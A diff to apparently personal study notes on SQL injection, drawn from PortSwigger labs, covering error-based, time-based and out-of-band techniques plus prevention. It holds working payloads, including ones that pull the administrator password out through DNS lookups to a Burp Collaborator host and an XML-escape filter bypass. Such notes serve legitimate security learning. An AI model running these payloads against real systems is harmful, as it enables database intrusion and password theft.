@@ -42,4 +42,53 @@ Types
   - Payload
       > xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
 
+    ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/72b6a743-553b-4ff2-bbe8-52f233a2fcc1)
 
+    - Link: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based#
+
+4. Time-based SQL Injection
+    - It is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false.
+
+   - Payload
+       > '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+
+    - The application takes 10 seconds to respond
+       > TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+    - The application responds immediately with no time delay
+       > TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+5. Out-of-band (OAST) SQLi
+    - The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
+    - Exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control.
+    - A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service)
+  
+    - Payload combine with XXE --> Will cause DNS lookuo to Burp Collaborator
+       > TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+    - Payload --> input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:
+      > '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+      ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/db8f381c-eff8-4fe6-976a-09009f2c430b)
+
+    - Payload for finding password of administrator --> it will be appended as subdomain of burp collaborator
+      > TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+## SQL injection in different contexts
+
+- Test other formats for SQLi like JSON or XML.
+- Bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:
+  > &#x53;ELECT * FROM information_schema.tables
+
+## Second-order SQL injection
+
+- First-order SQL injection occurs when application processes user input from HTTP request and injects the input into SQL query in an unsafe way.
+- Second-order SQL injection occurs when application does not process input from HTTP request immediately rather it stores if for future use. Later, when retreving the stored data it processes and inject input into SQL query in an unsafe way.
+
+## Prevention
+
+1. Parameterized queries / prepared statements.
+       - Normally, when SQL program arrives at the SQL server, the server will parse, compile and optimize it. Finally, the server will execute the program and return results of execution
+   ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/bb7f26c4-4cf3-4b53-8da1-d11903948b27)
+
+    - Prepared Statement work by making sure that user supplied data does not alter you SQL query's logic. These SQL statements are sent to and compiled by the SQL server before any user supplied parameters into the query. User input is added to statement right before execution. Anything that wasn't in the original statement will be treated as string data, not the executable SQL code.
+      ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/d06ebb70-3ebf-4965-8ae8-b239007de2b7)
